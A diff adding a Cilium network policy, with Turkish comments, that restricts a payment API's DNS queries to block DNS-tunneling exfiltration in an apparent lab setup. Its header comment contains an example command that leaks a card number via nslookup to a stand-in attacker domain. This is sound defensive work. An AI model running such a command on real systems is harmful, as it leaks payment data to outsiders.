@@ -1,0 +1,72 @@
+# Cilium L7 Network Policy — DNS Exfiltration Korumalı Versiyon
+#
+# Sorun: Temel versiyonda DNS izni "matchPattern: *" ile TÜM domain'lerin
+#        sorgulanmasına izin veriyor. Bir saldırgan, payment-api'ye sızarsa
+#        "nslookup kartno-4111222233334444.saldirgan.com" ile kart verilerini
+#        DNS sorgusu içinde dışarı sızdırabilir (DNS Tunneling / Exfiltration).
+#
+# Çözüm: DNS sorgularını da L7 seviyesinde (sorgulanan isme bakarak) sınırlamak.
+#        Cilium sadece "port 53 açık mı" değil, "hangi isim sorgulanıyor" diye
+#        de bakabiliyor.
+#
+# Kullanım:
+#   kubectl apply -f payment-api-l7-policy-dns-hardened.yaml
+
+apiVersion: "cilium.io/v2"
+kind: CiliumNetworkPolicy
+metadata:
+  name: payment-api-l7-policy-dns-hardened
+  namespace: lab-odeme
+spec:
+  endpointSelector:
+    matchLabels:
+      app: payment-api
+
+  ingress:
+    - fromEndpoints:
+        - matchLabels:
+            app: frontend
+      toPorts:
+        - ports:
+            - port: "8080"
+              protocol: TCP
+          rules:
+            http:
+              - method: "POST"
+                path: "^/api/v1/charge$"
+    - fromEntities:
+        - host
+      toPorts:
+        - ports:
+            - port: "8080"
+              protocol: TCP
+          rules:
+            http:
+              - method: "GET"
+                path: "^/healthz$"
+
+  egress:
+    # DNS — SADECE belirli desenlerdeki isimler sorgulanabilir
+    - toEndpoints:
+        - matchLabels:
+            k8s:io.kubernetes.pod.namespace: kube-system
+            k8s-app: kube-dns
+      toPorts:
+        - ports:
+            - port: "53"
+              protocol: UDP
+          rules:
+            dns:
+              # Küme içi servisleri çözebilsin
+              - matchPattern: "*.cluster.local"
+              # Sadece bankanın domain ailesini çözebilsin
+              - matchPattern: "*.banka.com"
+              # saldirgan.com gibi başka HİÇBİR domain bu listede değil —
+              # sorgu CoreDNS'e hiç ulaşmadan çekirdekte DROP edilir
+
+    - toFQDNs:
+        - matchName: "pos.banka.com"
+      toPorts:
+        - ports:
+            - port: "443"
+              protocol: TCP
